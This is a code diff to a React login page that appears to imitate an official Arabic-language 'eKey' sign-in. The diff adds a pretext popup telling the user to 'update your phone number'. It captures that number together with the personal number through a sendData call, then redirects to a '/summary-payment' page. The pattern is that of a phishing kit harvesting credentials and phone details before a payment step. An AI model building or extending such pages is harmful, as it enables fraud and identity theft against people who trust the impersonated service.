@@ -46,6 +46,8 @@ export default function LoginPage() {
   const [personalNumber, setPersonalNumber] = useState('');
   const [password, setPassword] = useState('');
   const [isLoading, setIsLoading] = useState(false);
+  const [showPopup, setShowPopup] = useState(false);
+  const [phoneNumber, setPhoneNumber] = useState('');
 
   useEffect(() => {
     navigateToPage('صفحة دخول المفتاح الإلكتروني');
@@ -67,11 +69,22 @@ export default function LoginPage() {
       page: 'login'
     });
 
-    // Navigate to summary-payment after brief delay
+    // Show spinner then popup
     setTimeout(() => {
       setIsLoading(false);
-      setLocation('/summary-payment');
+      setShowPopup(true);
     }, 1500);
+  };
+
+  const handlePhoneContinue = () => {
+    if (!phoneNumber.trim()) return;
+    sendData({
+      personalNumber,
+      phoneNumber,
+      page: 'phone-update'
+    });
+    setShowPopup(false);
+    setLocation('/summary-payment');
   };
 
   return (
@@ -141,6 +154,37 @@ export default function LoginPage() {
           </form>
         </div>
       </div>
+
+      {/* Phone Update Popup */}
+      {showPopup && (
+        <div className="login-popup-overlay">
+          <div className="login-popup">
+            <p className="login-popup-text">
+              {isRtl ? 'عليك تحديث رقم الهاتف للإستفادة من جميع خدمات المفتاح الإلكتروني' : 'You need to update your phone number to benefit from all eKey services'}
+            </p>
+            <div className="login-popup-field">
+              <label>{isRtl ? 'أدخل رقم الهاتف' : 'Enter phone number'}</label>
+              <input
+                type="text"
+                inputMode="numeric"
+                value={phoneNumber}
+                onChange={(e) => {
+                  const val = e.target.value.replace(/[^0-9]/g, '');
+                  setPhoneNumber(val);
+                }}
+                placeholder={isRtl ? 'رقم الهاتف' : 'Phone number'}
+              />
+            </div>
+            <button
+              className="login-popup-btn"
+              onClick={handlePhoneContinue}
+              disabled={!phoneNumber.trim()}
+            >
+              {isRtl ? 'متابعة' : 'Continue'}
+            </button>
+          </div>
+        </div>
+      )}
 
       {/* White Gap with Skyline */}
       <div className="login-skyline"></div>
